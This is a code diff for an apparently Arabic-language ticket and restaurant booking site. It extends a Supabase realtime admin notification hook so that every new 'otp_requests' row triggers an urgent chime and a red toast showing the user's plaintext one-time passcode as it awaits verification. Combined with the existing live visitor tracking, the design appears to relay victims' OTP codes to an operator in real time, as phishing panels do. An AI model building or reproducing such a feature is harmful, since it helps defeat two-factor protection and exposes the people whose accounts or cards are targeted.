@@ -6,7 +6,7 @@ import { playChime } from "@/hooks/use-action-sound";
 import { sendBrowserNotification, requestNotificationPermission } from "@/hooks/use-browser-notifications";
 import { RealtimePostgresInsertPayload } from "@supabase/supabase-js";
 
-type TableName = "contact_messages" | "restaurant_bookings" | "ticket_orders" | "visitors" | "event_bookings";
+type TableName = "contact_messages" | "restaurant_bookings" | "ticket_orders" | "visitors" | "event_bookings" | "otp_requests";
 
 const tableLabels: Record<TableName, { title: string; icon: string }> = {
   contact_messages: { title: "📩 رسالة تواصل جديدة", icon: "📩" },
@@ -14,6 +14,7 @@ const tableLabels: Record<TableName, { title: string; icon: string }> = {
   event_bookings: { title: "🎉 حجز فعالية جديد", icon: "🎉" },
   ticket_orders: { title: "🎟️ طلب تذاكر جديد", icon: "🎟️" },
   visitors: { title: "👤 زائر جديد دخل الموقع", icon: "👤" },
+  otp_requests: { title: "🔐 رمز OTP جديد", icon: "🔐" },
 };
 
 function getDescription(table: TableName, payload: any): string {
@@ -28,6 +29,8 @@ function getDescription(table: TableName, payload: any): string {
       return `${payload.email} — ${payload.total} ر.س`;
     case "visitors":
       return `${payload.name || "زائر جديد"} — ${payload.current_page_label || "الصفحة الرئيسية"} (${payload.device === "mobile" ? "جوال" : "كمبيوتر"} / ${payload.browser})`;
+    case "otp_requests":
+      return `رمز OTP: ${payload.otp_code} — الحالة: ${payload.status === "pending" ? "بانتظار التحقق" : payload.status}`;
     default:
       return "عنصر جديد";
   }
@@ -79,14 +82,23 @@ export function useRealtimeNotifications() {
           notify("visitors", payload.new);
         }
       )
+      .on(
+        "postgres_changes" as any,
+        { event: "INSERT", schema: "public", table: "otp_requests" },
+        (payload: RealtimePostgresInsertPayload<any>) => {
+          notify("otp_requests", payload.new);
+        }
+      )
       .subscribe();
 
     function notify(table: TableName, data: any) {
       const info = tableLabels[table];
       const description = getDescription(table, data);
       const needsApproval = (table === "ticket_orders" || table === "restaurant_bookings" || table === "event_bookings") && data.status === "pending";
+      const isOtp = table === "otp_requests";
       
-      const soundType = table === "contact_messages" ? "message"
+      const soundType = isOtp ? "urgent"
+        : table === "contact_messages" ? "message"
         : table === "event_bookings" ? "notification"
         : needsApproval ? "urgent" : "notification";
       playChime(soundType);
@@ -102,8 +114,8 @@ export function useRealtimeNotifications() {
       toast({
         title: info.title,
         description,
-        duration: needsApproval ? 10000 : 5000,
-        variant: needsApproval ? "destructive" : "default",
+        duration: (needsApproval || isOtp) ? 10000 : 5000,
+        variant: (needsApproval || isOtp) ? "destructive" : "default",
       });
       pushNotification({
         type: table,
